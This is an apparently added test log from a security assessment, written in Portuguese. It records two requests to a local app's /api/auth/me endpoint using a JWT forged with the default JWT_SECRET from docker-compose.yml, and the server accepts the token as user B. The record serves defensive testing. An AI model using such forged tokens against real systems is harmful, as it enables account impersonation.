@@ -1,0 +1,34 @@
+CASO T2.5 - Segredo de assinatura (forjar token com JWT_SECRET default)
+App: A3
+========================================================================
+----- Troca 1 -----
+# token forjado p/ id de B (1)
+>>> GET http://localhost:3000/api/auth/me
+>>> Authorization: Bearer eyJhbGciOiJI…4kOB4n7Y [103 chars]
+
+<<< HTTP 200 OK   (2 ms)
+<<< connection: keep-alive
+<<< content-length: 136
+<<< content-type: application/json; charset=utf-8
+<<< etag: W/"88-PTs20Y5dingEmq2dGM+2uoI1PS0"
+<<< keep-alive: timeout=5
+<<<
+<<< {"user":{"id":3,"name":"Usuario B","email":"usuario.b@teste.local","role":"user","active":true,"created_at":"2026-11-07T03:48:45.666Z"}}
+
+----- Troca 2 -----
+# (2)
+>>> GET http://localhost:3000/api/auth/me
+>>> Authorization: Bearer eyJhbGciOiJI…4kOB4n7Y [103 chars]
+
+<<< HTTP 200 OK   (1 ms)
+<<< connection: keep-alive
+<<< content-length: 136
+<<< content-type: application/json; charset=utf-8
+<<< etag: W/"88-PTs20Y5dingEmq2dGM+2uoI1PS0"
+<<< keep-alive: timeout=5
+<<<
+<<< {"user":{"id":3,"name":"Usuario B","email":"usuario.b@teste.local","role":"user","active":true,"created_at":"2026-11-07T03:48:45.666Z"}}
+
+------------------------------------------------------------------------
+OBSERVAÇÕES:
+JWT_SECRET default 'troque-este-segredo-em-producao' está no docker-compose.yml. Token {sub:3,tv:0} forjado com esse segredo foi aceito, personificando o usuário B.
